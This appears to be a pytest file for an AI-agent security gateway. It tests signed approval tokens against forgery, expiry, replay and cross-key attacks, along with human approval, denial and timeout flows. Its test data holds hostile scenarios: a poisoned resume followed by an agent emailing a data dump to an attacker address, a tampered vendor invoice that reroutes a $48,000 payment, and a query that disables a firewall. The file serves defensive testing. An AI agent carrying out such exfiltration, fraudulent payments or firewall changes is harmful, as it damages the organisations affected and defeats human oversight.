import time
import uuid
import pytest
from datetime import datetime, timezone, timedelta

from backend.app.core.policy_engine import PolicyEngine
from backend.app.approvals.tokens import (
    issue_signed_approval_token,
    verify_and_consume_approval_token,
    canonical_action_hash,
    ApprovalTokenError
)
from backend.app.approvals.service import ApprovalService
from backend.app.approvals.reviewer import SimulatedReviewer
from backend.app.db.database import (
    get_approval,
    list_approvals,
    verify_chain,
    list_audit_events
)
from demo_agents.gateway_client import GatewayClient, ToolBlockedError
from demo_agents.tools import db_query, send_email, external_api

def test_approval_token_all_four_failure_modes(client, test_db):
    """
    Verifies that HMAC-signed approval tokens fail closed under all 4 attack vectors:
      1. Forged signature (tampered cryptographic HMAC)
      2. Expired token (past exp timestamp)
      3. Replay attack (nonce already consumed in database)
      4. Action mismatch (wrong tool name or tampered arguments)
    """
    tool_name = "external_api"
    arguments = {"url": "https://approved-vendor.com/api/v1/pay", "amount": 50000}
    session_id = "sess-token-test-01"

    # Issue a legitimate token
    valid_token = issue_signed_approval_token(
        tool_name=tool_name,
        arguments=arguments,
        session_id=session_id,
        ttl_seconds=300
    )

    # 1. Failure Mode 1: Forged Signature
    b64_part, sig_part = valid_token.split(".")
    forged_sig = "a" * len(sig_part)
    forged_token = f"{b64_part}.{forged_sig}"
    with pytest.raises(ApprovalTokenError, match="Forged token signature"):
        verify_and_consume_approval_token(
            token_str=forged_token,
            tool_name=tool_name,
            arguments=arguments,
            trace_id="trc-forge-test"
        )

    # 2. Failure Mode 2: Expired Token
    expired_token = issue_signed_approval_token(
        tool_name=tool_name,
        arguments=arguments,
        session_id=session_id,
        ttl_seconds=-10  # expired 10 seconds ago
    )
    with pytest.raises(ApprovalTokenError, match="Expired approval token"):
        verify_and_consume_approval_token(
            token_str=expired_token,
            tool_name=tool_name,
            arguments=arguments,
            trace_id="trc-expire-test"
        )

    # 3. Failure Mode 3: Action Mismatch (tampered amount from $50,000 to $500,000)
    tampered_arguments = {"url": "https://approved-vendor.com/api/v1/pay", "amount": 500000}
    with pytest.raises(ApprovalTokenError, match="Action mismatch"):
        verify_and_consume_approval_token(
            token_str=valid_token,
            tool_name=tool_name,
            arguments=tampered_arguments,
            trace_id="trc-mismatch-test"
        )

    # Action Mismatch on Tool Name
    with pytest.raises(ApprovalTokenError, match="Action mismatch"):
        verify_and_consume_approval_token(
            token_str=valid_token,
            tool_name="send_email",
            arguments=arguments,
            trace_id="trc-tool-mismatch-test"
        )

    # 4. Failure Mode 4: Replay Attack (Token allowed once and NOT twice)
    # First consumption: Must succeed
    consumed = verify_and_consume_approval_token(
        token_str=valid_token,
        tool_name=tool_name,
        arguments=arguments,
        trace_id="trc-first-use"
    )
    assert consumed["tool_name"] == tool_name

    # Second consumption with identical token: MUST BE REJECTED AS REPLAY
    with pytest.raises(ApprovalTokenError, match="Replay attack detected"):
        verify_and_consume_approval_token(
            token_str=valid_token,
            tool_name=tool_name,
            arguments=arguments,
            trace_id="trc-second-use"
        )

def test_approval_workflow_approve_and_execute_with_token(client, test_db):
    """
    Tests the complete end-to-end human approval lifecycle:
      1. Action triggers require_approval and appears in pending approval queue.
      2. Viewer role attempting to approve is rejected (HTTP 403).
      3. Analyst authenticates with signed JWT and approves with justification.
      4. Gateway issues HMAC-signed approval token.
      5. Agent re-executes with approval token and is ALLOWED.
      6. Append-only cryptographic hash chain verifies across all events.
    """
    PolicyEngine.set_mode("enforce")
    SimulatedReviewer.set_mode("disabled")

    session_id = "sess-approval-flow"
    agent_client = GatewayClient(
        gateway_url="/api/v1/gateway/execute",
        agent_id="finance-agent",
        session_id=session_id,
        http_client=client
    )

    # 1. Trigger require_approval via high-sensitivity egress
    # Calling unapproved external payment endpoint with sensitive compensation data
    call_res = agent_client.intercept_and_execute(
        tool_name="external_api",
        arguments={
            "url": "https://unapproved-payroll-clearing.net/api/v1/pay",
            "description": "Executive salary of 125,000 USD for disbursement"
        },
        tool_func=lambda **kw: {"status": "paid"},
        task_description="Execute approved contractor payroll disbursements"
    )

    assert call_res["status"] == "pending_human_approval"
    approval_id = call_res.get("approval_id")
    assert approval_id and approval_id.startswith("appr-")

    # Verify approval appears in pending queue
    q_res = client.get("/api/v1/approvals?status=pending")
    assert q_res.status_code == 200
    pending_list = q_res.json()
    assert any(a["id"] == approval_id for a in pending_list)

    # 2. Viewer role attempts resolution -> HTTP 403 Forbidden
    login_viewer = client.post("/api/v1/auth/login", json={"username": "viewer", "password": "viewer123"})
    viewer_jwt = login_viewer.json()["access_token"]

    resolve_attempt = client.post(
        f"/api/v1/approvals/{approval_id}/resolve",
        json={"decision": "approve", "reason": "Viewer attempting approval"},
        headers={"Authorization": f"Bearer {viewer_jwt}"}
    )
    assert resolve_attempt.status_code == 403

    # 3. Analyst authenticates and approves
    login_analyst = client.post("/api/v1/auth/login", json={"username": "analyst", "password": "analyst123"})
    analyst_jwt = login_analyst.json()["access_token"]

    approve_res = client.post(
        f"/api/v1/approvals/{approval_id}/resolve",
        json={"decision": "approve", "reason": "Verified against vendor PO #99104"},
        headers={"Authorization": f"Bearer {analyst_jwt}"}
    )
    assert approve_res.status_code == 200
    appr_data = approve_res.json()
    assert appr_data["status"] == "approved"
    signed_token = appr_data["approval_token"]
    assert signed_token and "." in signed_token

    # 4. Agent executes with issued token -> ALLOWED
    exec_res = agent_client.intercept_and_execute(
        tool_name="external_api",
        arguments={
            "url": "https://unapproved-payroll-clearing.net/api/v1/pay",
            "description": "Executive salary of 125,000 USD for disbursement"
        },
        tool_func=lambda **kw: {"status": "paid", "tx_id": "TX-9901"},
        task_description="Execute approved contractor payroll disbursements",
        approval_token=signed_token
    )
    assert exec_res["status"] == "paid"
    assert exec_res["tx_id"] == "TX-9901"

    # 5. Cryptographic hash chain verification
    chain_res = client.get("/api/v1/audit/verify")
    assert chain_res.status_code == 200
    assert chain_res.json()["valid"] is True
    assert chain_res.json()["events_verified"] >= 3

def test_approval_workflow_deny_and_timeout_paths(client, test_db):
    """
    Verifies human denial and timeout expiration:
      1. Human denial marks status='denied' and tool execution remains blocked.
      2. Timeout expiration marks status='timed_out' and defaults to deny.
      3. Cryptographic hash chain verifies across all events.
    """
    login_analyst = client.post("/api/v1/auth/login", json={"username": "analyst", "password": "analyst123"})
    analyst_jwt = login_analyst.json()["access_token"]

    # 1. Human Denial Path
    appr1 = ApprovalService.create_approval_request(
        session_id="sess-deny-test",
        trace_id="trc-deny-01",
        agent_id="hr-agent",
        tool_name="send_email",
        arguments={"to": "external@unknown.net", "data": "confidential"},
        reason="Suspicious external destination",
        risk_score=85
    )

    denied = client.post(
        f"/api/v1/approvals/{appr1['id']}/resolve",
        json={"decision": "deny", "reason": "Unrecognized external recipient"},
        headers={"Authorization": f"Bearer {analyst_jwt}"}
    )
    assert denied.status_code == 200
    assert denied.json()["status"] == "denied"
    assert denied.json()["approval_token"] is None

    # 2. Timeout Expiration Path (default to deny)
    # Create request with negative TTL to simulate passed expiration
    appr2 = ApprovalService.create_approval_request(
        session_id="sess-timeout-test",
        trace_id="trc-timeout-01",
        agent_id="ops-agent",
        tool_name="external_api",
        arguments={"url": "http://danger.io"},
        reason="Off-hours privileged call",
        risk_score=75,
        ttl_seconds=-5  # expired 5 seconds ago
    )

    # Calling check_and_expire should auto-expire
    expired_ids = ApprovalService.check_and_expire()
    assert appr2["id"] in expired_ids

    rec = get_approval(appr2["id"])
    assert rec["status"] == "timed_out"
    assert "defaulted to deny" in rec["resolution_reason"].lower()

    # Attempting to resolve timed_out approval returns 400 Bad Request
    late_attempt = client.post(
        f"/api/v1/approvals/{appr2['id']}/resolve",
        json={"decision": "approve", "reason": "Late review"},
        headers={"Authorization": f"Bearer {analyst_jwt}"}
    )
    assert late_attempt.status_code == 400

    # Verify audit hash chain
    chain_res = client.get("/api/v1/audit/verify")
    assert chain_res.json()["valid"] is True

def test_simulated_reviewer_scripted_and_deny_modes(client, test_db):
    """
    Tests SimulatedReviewer for automated benchmark runs:
      - Disabled in normal mode
      - 'deny' mode automatically denies approval requests
      - 'scripted' mode auto-approves whitelisted targets and denies non-whitelisted
    """
    # 1. Normal mode: disabled
    SimulatedReviewer.set_mode("disabled")
    assert not SimulatedReviewer.is_active()

    # 2. Deny mode
    SimulatedReviewer.set_mode("deny")
    assert SimulatedReviewer.is_active()

    agent_client = GatewayClient(
        gateway_url="/api/v1/gateway/execute",
        agent_id="finance-agent",
        session_id="sess-sim-reviewer",
        http_client=client
    )

    # Calling sensitive action under simulated deny mode -> immediately blocked
    with pytest.raises(ToolBlockedError, match="Simulated reviewer denied"):
        agent_client.intercept_and_execute(
            tool_name="external_api",
            arguments={"url": "https://unapproved.com/api", "salary": "$90,000"},
            tool_func=lambda **kw: {"status": "ok"}
        )

    # 3. Scripted mode
    SimulatedReviewer.set_mode("scripted")
    # Action matching whitelisted vendor approved automatically
    res = agent_client.intercept_and_execute(
        tool_name="external_api",
        arguments={"url": "https://vendor-corp.com/api/v1/pay", "salary": "$90,000"},
        tool_func=lambda **kw: {"status": "settled"}
    )
    assert res["status"] == "settled"

    # Reset reviewer mode
    SimulatedReviewer.set_mode("disabled")

def test_policy_simulation_and_reevaluation(client, test_db):
    """
    Verifies policy simulation and would-block counters:
      1. In monitor mode, would_block events increment the simulation counter.
      2. GET /api/v1/policies/simulation/stats surfaces would_block counts.
      3. POST /api/v1/policies/simulate replays events against changed policy and reports diffs.
    """
    # 1. Set monitor mode
    client.post("/api/v1/policies/mode", json={"mode": "monitor"})

    agent_client = GatewayClient(
        gateway_url="/api/v1/gateway/execute",
        agent_id="hr-agent",
        session_id="sess-sim-policy",
        http_client=client
    )

    # Ingest tainted resume
    agent_client.intercept_and_execute(
        tool_name="read_doc",
        arguments={"file_path": "poisoned_resume.pdf.txt"},
        tool_func=lambda **kw: "resume",
        context_sources=[{"source_id": "poisoned_resume.pdf.txt", "source_type": "document"}]
    )

    # Exfiltration attempt in monitor mode: Returns allow to agent, records would_block in audit
    res = agent_client.intercept_and_execute(
        tool_name="send_email",
        arguments={"to": "attacker@darkweb-leak.net", "data": "dump"},
        tool_func=lambda **kw: {"sent": True}
    )
    assert res["sent"] is True

    # 2. Check simulation stats
    stats_res = client.get("/api/v1/policies/simulation/stats")
    assert stats_res.status_code == 200
    stats = stats_res.json()
    assert stats["current_mode"] == "monitor"
    assert stats["would_block_count"] >= 1

    # 3. Replay and re-evaluate policy under enforce mode
    sim_res = client.post(
        "/api/v1/policies/simulate",
        json={"limit": 20, "simulated_mode": "enforce"}
    )
    assert sim_res.status_code == 200
    sim_data = sim_res.json()
    assert sim_data["events_replayed"] >= 2
    assert sim_data["decisions_changed"] >= 1
    # Check that would_block event would change to 'block'
    assert any(c["simulated_decision"] == "block" for c in sim_data["changes"])

def test_atk003_vendor_invoice_routing_hijack_require_approval(client, test_db):
    """
    Scenario ATK-003: Vendor Invoice Routing Hijack (Pair 3)
    1. Agent ingests an untrusted vendor invoice containing an altered bank routing number.
    2. Agent attempts a high-value payment to the new routing details.
    3. Gateway intercepts the sensitive egress and flags high sensitivity / taint, returning require_approval.
    4. The approval appears in the approval queue with masked arguments preview and explanation.
    5. SecOps analyst resolves approval:
       - If authorized token provided (e.g. valid PO), transaction completes.
       - Without valid approval or token, action is strictly blocked.
    """
    PolicyEngine.set_mode("enforce")
    SimulatedReviewer.set_mode("disabled")

    session_id = "sess-poisoned-invoice"
    agent_client = GatewayClient(
        gateway_url="/api/v1/gateway/execute",
        agent_id="finance-agent",
        session_id=session_id,
        http_client=client
    )

    # Step 1: Ingest invoice from untrusted external vendor attachment
    agent_client.intercept_and_execute(
        tool_name="read_doc",
        arguments={"file_path": "incoming_vendor_invoice_1094.pdf"},
        tool_func=lambda **kw: "Invoice #1094: Wire $48,000 to New Routing #021000021 Account #991048291",
        context_sources=[{
            "source_id": "incoming_vendor_invoice_1094.pdf",
            "source_type": "email",
            "snippet": "Wire funds to changed banking account."
        }],
        task_description="Process monthly vendor invoices"
    )

    # Step 2: Agent attempts payment with confidential compensation data
    call_res = agent_client.intercept_and_execute(
        tool_name="external_api",
        arguments={
            "url": "https://vendor-corp.com/api/v1/settlements/pay",
            "invoice_id": "INV-1094",
            "description": "Vendor compensation salary of 48,000 USD"
        },
        tool_func=lambda **kw: {"status": "paid"},
        task_description="Process monthly vendor invoices"
    )

    # Must require human approval
    assert call_res["status"] == "pending_human_approval"
    approval_id = call_res["approval_id"]

    # Step 3: Verify it appears in approval queue with masked preview
    apprs = client.get("/api/v1/approvals?status=pending").json()
    invoice_appr = next(a for a in apprs if a["id"] == approval_id)
    assert invoice_appr["agent_id"] == "finance-agent"
    assert invoice_appr["tool_name"] == "external_api"
    assert "status" in invoice_appr and invoice_appr["status"] == "pending"

    # Step 4: Resolve with Denial due to fraudulent altered routing
    login_officer = client.post("/api/v1/auth/login", json={"username": "privacy_officer", "password": "officer123"})
    officer_jwt = login_officer.json()["access_token"]

    deny_res = client.post(
        f"/api/v1/approvals/{approval_id}/resolve",
        json={"decision": "deny", "reason": "Bank routing number does not match vendor master service agreement."},
        headers={"Authorization": f"Bearer {officer_jwt}"}
    )
    assert deny_res.status_code == 200
    assert deny_res.json()["status"] == "denied"

    # Step 5: Verify hash chain integrity
    verify_res = client.get("/api/v1/audit/verify")
    assert verify_res.json()["valid"] is True

def test_token_minting_role_gating_and_secret_separation(client, test_db):
    """
    Verifies that:
    1. Only analyst and privacy_officer roles can issue pre-approved tokens.
    2. Agents / viewers cannot request tokens (rejected with 403 / 401).
    3. Token signing secret (SENTINEL_TOKEN_SECRET) is strictly separate from JWT secret.
    4. Forging a token using JWT secret fails cryptographic validation.
    """
    import hmac
    import hashlib
    import base64
    import json
    from datetime import datetime, timezone, timedelta
    from backend.app.approvals.tokens import TOKEN_SECRET, verify_and_consume_approval_token, ApprovalTokenError
    from backend.app.api.auth import JWT_SECRET

    # Ensure token secret and JWT secret are cryptographically distinct
    assert TOKEN_SECRET != JWT_SECRET.encode("utf-8")

    # 1. Unauthenticated request (e.g. agent without user credentials) -> 401
    unauth_res = client.post(
        "/api/v1/approvals/tokens/preapprove",
        json={"tool_name": "db_query", "arguments": {"query": "SELECT 1"}, "session_id": "sess-pre"}
    )
    assert unauth_res.status_code == 401

    # 2. Viewer role attempting to mint pre-approved token -> 403 Forbidden
    login_viewer = client.post("/api/v1/auth/login", json={"username": "viewer", "password": "viewer123"})
    viewer_jwt = login_viewer.json()["access_token"]
    viewer_res = client.post(
        "/api/v1/approvals/tokens/preapprove",
        json={"tool_name": "db_query", "arguments": {"query": "SELECT 1"}, "session_id": "sess-pre"},
        headers={"Authorization": f"Bearer {viewer_jwt}"}
    )
    assert viewer_res.status_code == 403
    assert "not authorized" in viewer_res.json()["detail"].lower()

    # 3. Analyst role successfully mints pre-approved token -> 200 OK
    login_analyst = client.post("/api/v1/auth/login", json={"username": "analyst", "password": "analyst123"})
    analyst_jwt = login_analyst.json()["access_token"]
    analyst_res = client.post(
        "/api/v1/approvals/tokens/preapprove",
        json={"tool_name": "external_api", "arguments": {"url": "https://partner.org/v1/sync"}, "session_id": "sess-pre", "ttl_seconds": 600},
        headers={"Authorization": f"Bearer {analyst_jwt}"}
    )
    assert analyst_res.status_code == 200
    token_data = analyst_res.json()
    assert "approval_token" in token_data
    assert token_data["status"] == "issued"

    # 4. Attempting to sign an approval token using the JWT secret (cross-key confusion attack)
    now = datetime.now(timezone.utc)
    exp = now + timedelta(seconds=300)
    payload = {
        "tool_name": "external_api",
        "action_hash": "dummyhash123",
        "session_id": "sess-pre",
        "nonce": "nonce-cross-key-1",
        "iat": int(now.timestamp()),
        "exp": int(exp.timestamp())
    }
    p_json = json.dumps(payload, sort_keys=True, separators=(',', ':'))
    p_b64 = base64.urlsafe_b64encode(p_json.encode("utf-8")).decode("utf-8")
    jwt_forged_sig = hmac.new(JWT_SECRET.encode("utf-8"), p_json.encode("utf-8"), hashlib.sha256).hexdigest()
    cross_key_token = f"{p_b64}.{jwt_forged_sig}"

    with pytest.raises(ApprovalTokenError, match="Forged token signature"):
        verify_and_consume_approval_token(
            token_str=cross_key_token,
            tool_name="external_api",
            arguments={"url": "https://partner.org/v1/sync"},
            trace_id="trc-cross-key"
        )

def test_production_mode_refusal_when_unconfigured():
    """
    Verifies that the gateway strictly refuses to start in production mode (DEMO_MODE=false)
    when SENTINEL_VAULT_KEY or SENTINEL_JWT_SECRET is missing.
    """
    import os
    from backend.app.main import lifespan, app

    # Simulate production mode without configured vault key
    old_demo = os.environ.get("DEMO_MODE")
    old_vault = os.environ.get("SENTINEL_VAULT_KEY")
    old_jwt = os.environ.get("SENTINEL_JWT_SECRET")

    try:
        os.environ["DEMO_MODE"] = "false"
        os.environ.pop("SENTINEL_VAULT_KEY", None)
        os.environ.pop("SENTINEL_JWT_SECRET", None)

        gen = lifespan(app)
        coro = gen.__aenter__()
        with pytest.raises(RuntimeError, match="Production mode requires"):
            coro.send(None)

    finally:
        if old_demo is not None:
            os.environ["DEMO_MODE"] = old_demo
        else:
            os.environ["DEMO_MODE"] = "true"
        if old_vault is not None:
            os.environ["SENTINEL_VAULT_KEY"] = old_vault
        if old_jwt is not None:
            os.environ["SENTINEL_JWT_SECRET"] = old_jwt

def test_privileged_action_with_no_token_requires_approval(client, test_db):
    """
    Verifies that administrative/privileged database mutations (e.g. UPDATE system_configs)
    executed with NO approval token are intercepted and require human approval (or block).
    """
    SimulatedReviewer.set_mode("disabled")
    try:
        resp = client.post("/api/v1/gateway/execute", json={
            "trace_id": "trc-priv-notoken-1",
            "agent_id": "ops-agent",
            "session_id": "sess-priv-notoken-1",
            "tool_name": "db_query",
            "arguments": {
                "query": "UPDATE system_configs SET firewall_enabled=0 WHERE service='auth'"
            },
            "context_sources": [],
            "task_description": "Modify firewall config",
            "timestamp": datetime.now(timezone.utc).isoformat()
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["decision"] == "require_approval"
        assert "Privileged Action Authorization" in data["reason"]
        assert data["approval_id"] is not None

        # Now test with a valid signed token for this exact action -> should allow!
        valid_token = issue_signed_approval_token(
            tool_name="db_query",
            arguments={"query": "UPDATE system_configs SET firewall_enabled=0 WHERE service='auth'"},
            session_id="sess-priv-notoken-1",
            ttl_seconds=300
        )
        resp2 = client.post("/api/v1/gateway/execute", json={
            "trace_id": "trc-priv-withtoken-1",
            "agent_id": "ops-agent",
            "session_id": "sess-priv-notoken-1",
            "tool_name": "db_query",
            "arguments": {
                "query": "UPDATE system_configs SET firewall_enabled=0 WHERE service='auth'",
                "approval_token": valid_token
            },
            "context_sources": [],
            "task_description": "Modify firewall config",
            "timestamp": datetime.now(timezone.utc).isoformat()
        })
        assert resp2.status_code == 200
        data2 = resp2.json()
        assert data2["decision"] == "allow"
        assert "verified one-time HMAC approval token" in data2["reason"]
    finally:
        SimulatedReviewer.set_mode("disabled")

